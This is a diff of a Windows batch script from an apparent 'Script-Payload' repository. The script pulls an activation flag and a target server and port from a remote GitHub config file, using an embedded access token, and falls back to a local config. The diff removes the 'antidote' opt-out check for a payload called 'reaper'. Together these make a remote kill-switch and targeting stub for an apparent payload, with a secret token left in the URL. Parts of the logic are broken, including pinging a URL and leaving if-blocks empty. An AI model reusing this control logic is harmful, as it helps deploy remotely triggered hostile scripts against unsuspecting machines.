@@ -1,4 +1,4 @@
-@echo off
+@echo on
 setlocal enabledelayedexpansion
 
 :: color 0F is default color
@@ -7,13 +7,12 @@ setlocal enabledelayedexpansion
 
 :: Set the URL of the configuration file on GitHub
 set "configUrl=https://raw.githubusercontent.com/raf181/Script-Payload/main/Project%201/Config/Remote/config.cfg?token=GHSAT0AAAAAACD4CYPDS32BP27TSTTHHZ44ZGS2VNQ"
-
-:: Set loacl path for antidote codes
+set "config_local=Local-Config.cfg"
+:: Set loacl path for "antidote" codes
 set "local_antidote=%USERPROFILE%\OneDrive\Documentos\reaper_antidote_codes.cfg"
-
+:: set available_remote_config and active_status to spected values
 set "available_remote_config=true"
 set "active_status=false"
-
 :: Loop through each line in the fetched configuration file
 for /f "delims=" %%i in ('curl -s "%configUrl%"') do (
     :: Check if the line contains "Active=true"
@@ -27,7 +26,7 @@ for /f "delims=" %%i in ('curl -s "%configUrl%"') do (
         if %errorlevel% equ 0 (
             set "active_status=false"
             :: Action when "Active=false" is found in the configuration file.
-        ) else (
+            ) else (
             :: Try pinging the remote URL to check availability
             ping %configUrl% -n 1 >nul 2>&1
             if %errorlevel% neq 0 (
@@ -35,15 +34,16 @@ for /f "delims=" %%i in ('curl -s "%configUrl%"') do (
                 set "available_remote_config=false"
             ) else (
                 :: Action when remote file is available but no Active status found.
+                echo
             )
         )
     )
 )
-
 :: Check the different scenarios and perform actions accordingly
 if %available_remote_config% equ true (
     if %active_status% equ true (
         echo Remote file available with "Active=true".
+        set "config_file=curl -s %configUrl%"
         goto Active
     ) else (
         echo Remote file available with "Active=false".
@@ -57,11 +57,11 @@ if %available_remote_config% equ true (
         :: Local configuration file exists
         echo Local configuration file found. Checking if it is active...
         :: Check if the line "Active=true" exists in the local configuration file
-        findstr /i "Active=true" "Local-Config.cfg" >nul
+        findstr /i "Active=true" "%config_local%" >nul
         if %errorlevel% equ 0 (
             :: The line "Active=true" is found in the local configuration file
             echo Local configuration file is active. Running the script...
-            set "config_file=type Local-Config.cfg"
+            set "config_file=type %config_local%"
             goto Active    
         ) else (
             :: The line "Active=true" is not found or is set to "Active=false" in the local configuration file
@@ -82,28 +82,6 @@ if %available_remote_config% equ true (
 
 
 :Active 
-:: Retrieve the Antidote codes from the remote file
-:: for /f "tokens=2 delims== " %%a in ('%config_file% ^| findstr /i "Antidote_Codes"') do (
-::     set "antidoteCode=%%~a"
-::     :: Remove the surrounding double quotes if present
-::     set "antidoteCode=!antidoteCode:"=!"
-::     
-::     :: Check if the Antidote code matches any of the codes on the target machine
-::     findstr /i /c:"!antidoteCode!" "%local_antidote%" >nul
-::     if !errorlevel! equ 0 (
-::         :: The Antidote code is found in the target file
-::         echo Antidote code found. Script will not run.
-::         echo Exiting...
-::         echo.
-::         pause
-::         exit /b 0
-::     )
-:: )
-
-:: Antidote code not found in the target file, continue running the script
-:: echo Antidote code not found. Running the script...
-:: Add the rest of your script code here
-
 :: Read the remote configuration file
 for /f "usebackq tokens=1* delims== " %%a in (`%config_file%`) do (
     if /i "%%a"=="SERVER_DSERVER_REMOTE" (
@@ -117,6 +95,8 @@ for /f "usebackq tokens=1* delims== " %%a in (`%config_file%`) do (
 
 :: Validate if all the required variables are set
 if not defined target_server (
+    echo.
 )
 if not defined target_port (
+    echo.
 )
